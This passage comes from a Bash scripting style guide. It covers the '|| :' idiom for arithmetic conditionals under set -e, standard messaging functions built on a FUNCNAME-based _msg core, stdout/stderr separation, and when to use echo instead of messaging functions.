- **Use `2>/dev/null`** to suppress error messages while checking return code
- **Use both** (`2>/dev/null || true`) only when both messages and return code are irrelevant
- **Verify after** suppressed operations when possible
- **Test without** suppression first to ensure operation is correct

**Key principle:** Error suppression should be the exception, not the rule. Every `2>/dev/null` and `|| true` is a deliberate decision that this specific failure is safe to ignore. Document the decision with a comment explaining why.


---


**Rule: BCS0606**

## Conditional Declarations with Exit Code Handling

**When using arithmetic conditionals for optional declarations or actions under `set -e`, append `|| :` to prevent false conditions from triggering script exit.**

**Rationale:**

- **Arithmetic conditionals return exit codes**: `(())` returns 0 (success) when true, 1 (failure) when false
- **`set -e` exits on non-zero**: Under `set -euo pipefail`, any command returning non-zero exits the script
- **Conditional execution is intentional**: Sometimes we want `((condition)) && action` where action runs only if condition is true
- **False condition shouldn't exit**: When condition is false, we want to continue, not exit
- **`|| :` provides safe fallback**: The colon command `:` is a no-op that always returns 0 (success)
- **Idiomatic shell pattern**: `|| :` is the traditional Unix idiom for "ignore this error"

**The core problem:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

# ✗ DANGEROUS: Script exits here if complete=0!
((complete)) && declare -g BLUE=$'\033[0;34m'
# When complete=0:
#   1. (( complete )) evaluates to false, returns 1
#   2. && short-circuits, declare never runs
#   3. Overall exit code is 1 (from the arithmetic test)
#   4. set -e sees exit code 1 and terminates the script!

echo 'This line never executes'
```

**The solution:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

# ✓ SAFE: Script continues even when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m' || :
# When complete=0:
#   1. (( complete )) evaluates to false, returns 1
#   2. && short-circuits, declare never runs
#   3. || : triggers, colon returns 0
#   4. Overall exit code is 0 (success)
#   5. Script continues normally

echo 'This line executes correctly'
```

**Why `:` (colon) over `true`:**

```bash
# Both are functionally equivalent no-ops that return 0

# ✓ PREFERRED: Colon command
((condition)) && action || :
# - Traditional Unix idiom (dates to Bourne shell)
# - Built-in command (no fork)
# - 1 character (concise)
# - Standard in POSIX scripts
# - Slightly faster (no PATH lookup)

# ✓ ACCEPTABLE: true command
((condition)) && action || true
# - More explicit/readable for beginners
# - 4 characters (slightly more verbose)
# - Also a built-in (no performance difference in practice)
# - Common in modern scripts

# Both are correct; colon is traditional shell idiom
```

**Common patterns:**

**Pattern 1: Conditional variable declaration**

```bash
declare -i complete=0 verbose=0

# Declare extended variables only in complete mode
((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :

# Print variables only in verbose mode
((verbose)) && declare -p NC RED GREEN YELLOW || :
```

**Pattern 2: Nested conditional declarations**

```bash
if ((color)); then
  declare -g NC=$'\033[0m' RED=$'\033[0;31m'
  ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
else
  declare -g NC='' RED=''
  ((complete)) && declare -g BLUE='' MAGENTA='' || :
fi
```

**Pattern 3: Conditional block execution**

```bash
((verbose)) && {
  declare -p NC RED GREEN
  ((complete)) && declare -p BLUE MAGENTA || :
} || :
```

**Pattern 4: Multiple conditional actions**

```bash
declare -i flags=0 complete=0

if ((flags)); then
  declare -ig VERBOSE=${VERBOSE:-1}
  ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
fi
```

**Real-world example from color-set.sh:**

```bash
#!/bin/bash
# Dual-purpose script: sourceable library + executable demo

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0

  # Parse arguments to set flags
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose)  verbose=1 ;;
      always)   color=1 ;;
      never)    color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "$FUNCNAME: error: Invalid mode ${1@Q}"
                return 1 ;;
    esac
    shift
  done

  # Auto-detect if color not explicitly set
  ((color== -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; }

  # Declare flag variables only if flags mode active
  if ((flags)); then
    declare -ig VERBOSE=${VERBOSE:-1}
    # Only declare DEBUG/DRY_RUN/PROMPT in complete mode
    ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    # Always declare basic colors
    declare -g NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m'
    # Only declare extended colors in complete mode
    ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' || :
  else
    declare -g NC='' RED='' GREEN=''
    ((complete)) && declare -g BLUE='' MAGENTA='' BOLD='' || :
  fi

  # Print variables only in verbose mode
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE || :
    declare -p NC RED GREEN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT || :
      declare -p BLUE MAGENTA BOLD
    } || :
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: only execute when run directly
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0
#!/bin/bash #semantic
set -euo pipefail

color_set "$@"

#fin
```

This script demonstrates:
- Two-tier system (basic vs complete)
- Feature flags (flags mode)
- Multiple conditional declarations
- Safe handling under `set -e`
- All using `|| :` for exit code management

**When to use this pattern:**

**✓ Use `|| :` when:**

1. **Optional variable declarations** based on feature flags
   ```bash
   ((DEBUG)) && declare -g DEBUG_OUTPUT=/tmp/debug.log || :
   ```

2. **Conditional exports** for environment variables
   ```bash
   ((PRODUCTION)) && export PATH=/opt/app/bin:$PATH || :
   ```

3. **Feature-gated actions** that should be silent when disabled
   ```bash
   ((VERBOSE)) && echo "Processing $file" || :
   ((DRY_RUN)) && echo "Would execute: $command" || :
   ```

4. **Optional logging or debug output**
   ```bash
   ((LOG_LEVEL >= 2)) && log_debug "Variable value: $var" || :
   ```

5. **Tier-based variable sets** (like basic vs complete colors)
   ```bash
   ((FULL_FEATURES)) && declare -g EXTRA_VAR=value || :
   ```

**✗ Don't use when:**

1. **The action must succeed** - use explicit error handling instead
   ```bash
   # ✗ Wrong - suppresses critical errors
   ((required_flag)) && critical_operation || :

   # ✓ Correct - check explicitly
   if ((required_flag)); then
     critical_operation || die 1 'Critical operation failed'
   fi
   ```

2. **You need to know if it failed** - capture the exit code
   ```bash
   # ✗ Wrong - hides failure
   ((condition)) && risky_operation || :

   # ✓ Correct - handle failure
   if ((condition)) && ! risky_operation; then
     error 'risky_operation failed'
     return 1
   fi
   ```

3. **The condition itself is the operation** - use if statement
   ```bash
   # ✗ Awkward - condition is the operation
   ((count+=1)) && echo 'Incremented' || :

   # ✓ Clearer - just do the operation
   count+=1
   echo 'Incremented'
   ```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG: No || :, script exits when condition is false
((complete)) && declare -g BLUE=$'\033[0;34m'
# If complete=0, script exits with set -e!

# ✓ ACCEPTABLE: Double negative, less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'
# Logically equivalent but can sometimes be harder to understand

# ✗ WRONG: Using true instead of : (verbose, less idiomatic)
((complete)) && declare -g BLUE=$'\033[0;34m' || true
# Works but : is preferred in shell scripts

# ✗ WRONG: Complex fallback
((complete)) && declare -g BLUE=$'\033[0;34m' || { true; }
# Unnecessarily complex, just use :

# ✗ WRONG: Suppressing critical operations
((user_confirmed)) && delete_all_files || :
# If delete_all_files fails, error is hidden!

# ✓ CORRECT: Check critical operations explicitly
if ((user_confirmed)); then
  delete_all_files || die 1 'Failed to delete files'
fi
```

**Comparison of alternatives:**

**Alternative 1: if statement (most explicit)**

```bash
# ✓ Most readable, best for complex logic
if ((complete)); then
  declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m'
fi

# Pros: Crystal clear intent, no exit code issues
# Cons: More verbose (4 lines vs 1)
# Use when: Logic is complex or has multiple statements
```

**Alternative 2: Arithmetic test with `|| :`**

```bash
# ✓ Concise, safe under set -e
((complete)) && declare -g BLUE=$'\033[0;34m' || :

# Pros: One line, traditional idiom, safe
# Cons: Less obvious for beginners
# Use when: Simple conditional declaration
```

**Alternative 3: Double-negative pattern**

```bash
# ✓ Works but less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# Pros: No || : needed (fails when complete≠0, which is fine)
# Cons: Double negative can sometimes be confusing
```

**Alternative 4: Temporarily disable errexit**

```bash
# ✗ Not recommended - disables error checking
set +e
((complete)) && declare -g BLUE=$'\033[0;34m'
set -e

# Pros: None
# Cons: Disables error checking for all commands in between
# Use when: Never - use || : instead
```

**Testing the pattern:**

```bash
#!/bin/bash
set -euo pipefail

# Test 1: Verify false condition doesn't exit
test_false_condition() {
  local -i flag=0

  # Without || :, this would exit the script
  ((flag)) && echo "This won't print" ||:

  # Script continues
  echo "Test 1 passed: false condition didn't exit"
}

# Test 2: Verify true condition executes action
test_true_condition() {
  local -i flag=1
  local -- output=''

  # Action should execute
  ((flag)) && output="executed" || :

  [[ "$output" == "executed" ]] || {
    echo "Test 2 failed: true condition didn't execute"
    return 1
  }

  echo 'Test 2 passed: true condition executed action'
}

# Test 3: Verify nested conditionals
test_nested_conditionals() {
  local -i outer=1 inner=0
  local -i executed=0

  ((outer)) && {
    executed=1
    ((inner)) && executed=2 || :
  } || :

  ((executed == 1)) || {
    echo "Test 3 failed: expected executed=1, got $executed"
    return 1
  }

  echo 'Test 3 passed: nested conditionals work correctly'
}

# Test 4: Verify set -e still catches real errors
test_error_detection() {
  local -i flag=1

  # Real error should still exit
  if ((flag)) && false; then
    echo 'Test 4 failed: error not detected'
    return 1
  fi

  echo 'Test 4 passed: real errors still caught'
}

# Run tests
test_false_condition
test_true_condition
test_nested_conditionals
test_error_detection

echo 'All tests passed!'
#fin
```

**Summary:**

- **Use `|| :`** after `((condition)) && action` to prevent false conditions from triggering `set -e` exit
- **Colon `:` is preferred** over `true` (traditional shell idiom, concise)
- **Only for optional operations** - critical operations need explicit error handling
- **Document intent** with comments when the pattern might not be obvious
- **Test both paths** - verify behavior when condition is true and false
- **Cross-reference**: See BCS0705 (Arithmetic Operations), BCS0805 (Error Suppression), BCS0801 (Exit on Error)

**Key principle:** When you want conditional execution without risking script exit, use `((condition)) && action || :`. This makes your intent explicit: "Do this if condition is true, but don't exit if condition is false."


---


**Rule: BCS0700**

# Input/Output & Messaging

This section establishes standardized messaging patterns with color support for terminal output and proper stream handling. It defines the complete messaging suite: `_msg()` (core function using FUNCNAME), `vecho()` (verbose output), `success()` (success messages), `warn()` (warnings), `info()` (informational), `debug()` (debug output), `error()` (unconditional error to stderr), `die()` (exit with error), and `yn()` (yes/no prompts). It explains STDOUT vs STDERR separation (data vs diagnostics), proper usage documentation patterns, and when to use messaging functions versus bare echo statements. Error output must always go to STDERR with `>&2` placed at the beginning of commands for clarity.


---


**Rule: BCS0701**

## Standardized Messaging and Color Support
```bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```


---


**Rule: BCS0702**

## STDOUT vs STDERR
- All error messages should go to `STDERR`
- Place `>&2` at the *beginning* commands for clarity

```bash
# Preferred format
somefunc() {
  >&2 echo "[$(date -Ins)]: $*"
}

# Also acceptable
somefunc() {
  echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
}
```


---


**Rule: BCS0703**

## Core Message Functions

**Every script should implement a standard set of messaging functions that provide consistent, colored, contextual output. Use a private `_msg()` core function that detects the calling function via `FUNCNAME` to automatically format messages appropriately.**

**Rationale:**

- **Consistency**: Same message format across all scripts
- **Context**: `FUNCNAME` inspection automatically adds appropriate prefix/color
- **DRY Principle**: Single `_msg()` implementation reused by all messaging functions
- **Verbosity Control**: Conditional functions (`info`, `warn`) respect `VERBOSE` flag
- **Proper Streams**: Errors/warnings to stderr, regular output to stdout
- **User Experience**: Colors and symbols make output scannable
- **Debugging**: `DEBUG` flag enables detailed diagnostic output

**Core messaging function pattern:**

The pattern uses a private `_msg()` function that inspects `FUNCNAME[1]` (the calling function) to determine formatting.

### Understanding FUNCNAME Inspection

**The FUNCNAME array** is a Bash built-in that contains the current function call stack:
- `${FUNCNAME[0]}` = Current function name (`_msg` in this case)
- `${FUNCNAME[1]}` = Calling function name (`info`, `warn`, `error`, etc.)
- `${FUNCNAME[2]}` = Function that called the calling function
- And so on up the call stack

**Why this is powerful:**

Instead of passing a parameter (`_msg "INFO" "$message"`), we inspect `FUNCNAME[1]` to automatically detect **who called us**. This enables a single `_msg()` implementation to format differently based on caller.

**Call stack example:**
```bash
main() {
  process_file test.txt
}

process_file() {
  info "Processing ${1@Q}"
  # When info() calls _msg():
  #   FUNCNAME[0] = "_msg"     (current function)
  #   FUNCNAME[1] = "info"     (caller - this determines formatting!)
  #   FUNCNAME[2] = "process_file"
  #   FUNCNAME[3] = "main"
}
```

**Implementation:**

```bash
# Private core messaging function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  # Inspect FUNCNAME[1] to detect calling function
  # This determines which color/symbol to use
  case ${FUNCNAME[1]} in
    vecho)   ;;  # No special prefix
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;  # Other callers get plain prefix
  esac

  # Print each message argument on separate line
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}
```

**Benefits of FUNCNAME inspection:**
1. **DRY**: Single `_msg()` function, no duplication
2. **Automatic**: Caller doesn't pass formatting hint, it's detected automatically
3. **Consistent**: Impossible to pass wrong level (`info "ERROR: ..."` prevented)
4. **Maintainable**: Add new message types by adding wrapper functions, no `_msg()` changes needed
5. **Self-documenting**: Function name IS the message level

**Public wrapper functions:**

```bash
# Conditional output functions (respect VERBOSE flag)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output (respects DEBUG flag)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output (always shown)
error()   { >&2 _msg "$@"; }

# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Usage examples:**

```bash
# Information (only shown if VERBOSE=1)
info 'Starting processing...'
info "Processing $count files"

# Success (only shown if VERBOSE=1)
success 'Build completed'
success "Installed to $PREFIX"

# Warning (only shown if VERBOSE=1)
warn 'Configuration file not found, using defaults'
warn "Deprecated option: $old_option"

# Error (always shown)
error 'Failed to connect to server'
error "Invalid file: $filename"

# Debug (only shown if DEBUG=1)
debug "Variable state: count=$count, file=$file"
debug 'Entering cleanup phase'

# Exit with error message
die 1 'Critical error occurred'
die 2 "Invalid argument ${arg@Q}"
die 22 "File not found ${file@Q}"

# Exit without message (just return code)
die 1
```

**Why stdout vs stderr matters:**

```bash
# info/warn/error go to stderr (>&2)
# This allows:

# 1. Separating data output from messages
data=$(./script.sh)  # Gets only data, not info messages

# 2. Redirecting errors separately
./script.sh 2>errors.log  # Errors to file, data to stdout

# 3. Piping data while seeing messages
./script.sh | process_data  # Messages visible, data piped
```

**Color definitions:**

```bash
# Standard colors (conditional on terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Flag variables:**

```bash
# Global flags controlling output
declare -i VERBOSE=0  # Set to 1 for info/warn/success messages
declare -i DEBUG=0    # Set to 1 for debug messages
declare -i PROMPT=1   # Set to 0 to disable prompts (for automation)
```

**Complete messaging function set:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global flags
declare -i VERBOSE=0
declare -i DEBUG=0
declare -i PROMPT=1

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Messaging Functions
# ============================================================================

# Core message function using FUNCNAME for context
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

# Conditional output based on verbosity
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output
error()   { >&2 _msg "$@"; }

# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Yes/no prompt
yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

# ============================================================================
# Main script logic
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -d|--debug)   DEBUG=1 ;;
    -y|--yes)     PROMPT=0 ;;
    *)            die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  readonly -- VERBOSE DEBUG PROMPT

  info "Starting $SCRIPT_NAME $VERSION"
  debug 'Debug mode enabled'

  # Example operations
  info 'Processing files...'
  success 'Files processed'

  if yn 'Continue with deployment?'; then
    info 'Deploying...'
    success 'Deployment complete'
  else
    warn 'Deployment skipped'
  fi
}

main "$@"
#fin
```

**Alternative: Simplified _msg without colors:**

For scripts that don't need colors:

```bash
_msg() {
  local -- level="${FUNCNAME[1]}"
  printf '%s: %s: %s\n' "$SCRIPT_NAME" "${level^^}" "$*"
}

info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }
die()     { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Variation: Log to file:**

```bash
LOG_FILE=/var/log/"$SCRIPT_NAME".log

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg timestamp

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    # Print to terminal with colors
    printf '%s %s\n' "$prefix" "$msg"

    # Log to file without colors (strip ANSI codes)
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s: %s\n' "$timestamp" "${FUNCNAME[1]^^}" "$msg" >> "$LOG_FILE"
  done
}
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using echo directly
echo "Error: file not found"
# Problems:
# 1. Not going to stderr
# 2. No script name prefix
# 3. No color
# 4. Not respecting VERBOSE

# ✓ Correct - use messaging function
error 'File not found'

# ✗ Wrong - duplicating message logic
info() {
  echo "[$SCRIPT_NAME] INFO: $*"
}
warn() {
  echo "[$SCRIPT_NAME] WARN: $*"
}
error() {
  echo "[$SCRIPT_NAME] ERROR: $*"
}
# Lots of duplication!

# ✓ Correct - use _msg core function
_msg() {
  local -- prefix="$SCRIPT_NAME:"
  case "${FUNCNAME[1]}" in
    info)  prefix+=" INFO:" ;;
    warn)  prefix+=" WARN:" ;;
    error) prefix+=" ERROR:" ;;
  esac
  echo "$prefix $*"
}
info()  { _msg "$@"; }
warn()  { _msg "$@"; }
error() { >&2 _msg "$@"; }

# ✗ Wrong - errors to stdout
error() {
  echo "[ERROR] $*"  # Goes to stdout!
}

# ✓ Correct - errors to stderr
error() {
  >&2 _msg "$@"
}

# ✗ Wrong - ignoring VERBOSE flag
info() {
  >&2 _msg "$@"
}
# Always prints, even when VERBOSE=0!

# ✓ Correct - check VERBOSE
info() {
  ((VERBOSE)) || return 0
  >&2 _msg "$@"
}

# ✗ Wrong - die without exit code
die() {
  error "$@"
  exit 1  # Always exit 1, can't customize
}

# ✗ Wrong - inefficient
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ✓ Correct - die with exit code parameter
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ✗ Acceptable only if prompting is unconditional
yn() {
  local reply
  read -r -n 1 -p "$1 y/n " reply
  [[ ${reply,,} == y ]]
}
# Can't disable prompts for automation!

# ✓ Correct - yn() respects PROMPT flag
yn() {
  ((PROMPT)) || return 0  # Non-interactive mode
  local reply
  >&2 read -r -n 1 -p "$SCRIPT_NAME: $1 y/n " reply
  >&2 echo
  [[ ${reply,,} == y ]]
}

# ✓ Correct - if warn() defined in script
yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

**Function variants for different needs:**

**Minimal set (no colors, no flags):**

```bash
info()  { >&2 echo "$SCRIPT_NAME: $*"; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Medium set (with VERBOSE, no colors):**

```bash
declare -i VERBOSE=0

info()  { ((VERBOSE)) && >&2 echo "$SCRIPT_NAME: $*"; return 0; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Full set (with colors, flags, _msg core):**

See complete example above.

**Summary:**

- **Use _msg() core function** with FUNCNAME inspection for DRY implementation
- **Conditional functions** (`info`, `warn`) respect `VERBOSE` flag
- **Unconditional functions** (`error`) always display
- **Errors to stderr**: `>&2` prefix on error/warn/info functions
- **Colors conditional** on terminal output: `[[ -t 1 && -t 2 ]]`
- **die() takes exit code** as first parameter: `die 1 'Error message'`
- **yn() respects PROMPT** flag for non-interactive mode
- **Consistent prefix**: Every message shows script name
- **Remove unused** functions in production (see Section 6)

**Key principle:** Messaging functions provide a consistent, professional user interface. The _msg() core function with FUNCNAME inspection eliminates code duplication and makes adding new message types trivial. Always separate informational output (stderr) from data output (stdout).


---


**Rule: BCS0704**

## Usage Documentation
```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
  # Example 2
  $SCRIPT_NAME -qn 10 file.txt
EOT
}
```


---


**Rule: BCS0705**

## Echo vs Messaging Functions

**Choose between plain `echo` and messaging functions based on the context, formatting requirements, and output destination. Use messaging functions for operational status updates that respect verbosity settings, and plain `echo` for data output and structured documentation that must always display.**

**Rationale:**

- **Stream Separation**: Messaging functions go to stderr (user-facing), `echo` goes to stdout (data/parseable output)
- **Verbosity Control**: Messaging functions respect `VERBOSE` flag, `echo` always displays (critical for pipeable data)
- **Consistent Formatting**: Messaging functions provide uniform prefixes, colors, and script name identification
- **Output Purpose**: Operational messages vs data output require different handling
- **Parseability**: Plain `echo` output is predictable and parseable; messaging functions include formatting
- **Script Composition**: Using proper streams allows scripts to be combined in pipelines without mixing data and status messages

**When to use messaging functions (`info`, `success`, `warn`, `error`):**

**1. Operational status updates:**

```bash
# Script progress indicators
info 'Starting database backup...'
success 'Database backup completed'
warn 'Backup size exceeds threshold'
error 'Database connection failed'

# Processing notifications
info "Processing file $count of $total"
success "Processed $filename successfully"
```

**2. User-facing diagnostic information:**

```bash
# Diagnostic output
debug "Variable state: count=$count, total=$total"
debug 'Entering validation phase'

# Configuration feedback
info "Using configuration file ${config_file@Q}"
info "Timeout set to $timeout seconds"
```

**3. Messages that should respect verbosity:**

```bash
# Only shown if VERBOSE=1
info 'Checking prerequisites...'
info 'Loading configuration...'
success 'All checks passed'

# Always shown (errors)
error 'Configuration file not found'
die 1 'Critical dependency missing'
```

**4. Messages needing visual formatting:**

```bash
# Color-coded status
success 'Build completed'        # Green checkmark
warn 'Using default settings'    # ▲ Yellow warning
error 'Compilation failed'       # Red X
info 'Tests running...'          # Cyan info icon
```

**When to use plain `echo`:**

**1. Data output (stdout):**

```bash
# Function returns data
get_user_email() {
  local -- username=$1
  local -- email

  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)

  echo "$email"  # Data output - must use echo
}

# Caller can capture output
user_email=$(get_user_email 'alice')
```

**2. Help text and documentation:**

```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}
```

**3. Structured multi-line output:**

```bash
# Report generation
generate_report() {
  echo 'System Report'
  echo '============='
  echo
  echo 'Disk Usage:'
  df -h
  echo
  echo 'Memory Usage:'
  free -h
  echo
  echo 'Load Average:'
  uptime
}
```

**4. Output intended for parsing or piping:**

```bash
# List output for processing
list_users() {
  local -- user

  while IFS=: read -r user _; do
    echo "$user"
  done < /etc/passwd
}

# Can be piped or processed
list_users | grep '^admin' | wc -l
```

**5. Output that should always display regardless of verbosity:**

```bash
# Results that user explicitly requested
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Final summary output
echo "Processed $success_count files successfully"
echo "Failed: $fail_count files"
```

**Decision matrix:**

```bash
# Is this operational status or data?
#   Status → messaging function
#   Data   → echo

# Should this respect verbosity settings?
#   Yes → messaging function (info, warn, debug)
#   No  → echo (or error for critical messages)

# Will this be parsed or piped?
#   Yes → echo to stdout
#   No  → messaging function to stderr

# Is this multi-line formatted output?
#   Yes → echo (with here-doc or multiple statements)
#   No  → messaging function (single-line status)

# Does this need color/formatting?
#   Yes → messaging function
#   No  → echo
```

**Complete example showing both:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Messaging Functions (stderr, with verbosity control)
# ============================================================================

declare -i VERBOSE=1 DEBUG=0

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}
# Conditional output based on verbosity
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Debug output
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }
# Unconditional error output
error()   { >&2 _msg "$@"; }
# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Data Functions (stdout, always output)
# ============================================================================

# Return user's home directory (data output)
get_user_home() {
  local -- username=$1
  local -- home_dir

  home_dir=$(getent passwd "$username" | cut -d: -f6)

  [[ -n "$home_dir" ]] || return 1

  echo "$home_dir"  # Data to stdout
}

# Generate structured report (data output)
show_report() {
  echo 'User Report'
  echo '==========='
  echo
  echo "Username: $USER"
  echo "Home: $HOME"
  echo "Shell: $SHELL"
  echo
  echo 'Disk Usage:'
  df -h "$HOME" | tail -n 1
}

# ============================================================================
# Documentation Functions (stdout, always output)
# ============================================================================

show_help() {
  cat <<EOT
